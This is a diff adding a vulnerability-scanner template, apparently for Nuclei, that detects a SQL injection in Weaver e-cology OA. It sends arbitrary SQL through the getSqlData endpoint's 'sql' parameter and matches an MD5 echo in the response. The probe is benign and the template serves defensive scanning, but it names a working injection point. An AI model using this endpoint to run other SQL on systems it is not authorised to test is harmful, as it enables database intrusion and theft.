@@ -1,0 +1,40 @@
+id: weaver_e_cology_oa-sql_injection-CT-442574
+info:
+  name: Weaver e-cology OA SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SQL Injection vulnerability in Weaver e-cology OA system, allowing malicious SQL queries to be executed.
+
+variables:
+  rand1: "{{rand_int(1, 20000)}}"
+  rand2: "{{rand_int(20000, 50000)}}"
+
+http:
+  - id: r1
+    method: GET
+    path:
+      - "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand1}}')),3,32)"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, md5(rand1))
+
+  - id: r2
+    method: GET
+    path:
+      - "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand2}}')),3,32)"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, md5(rand2))
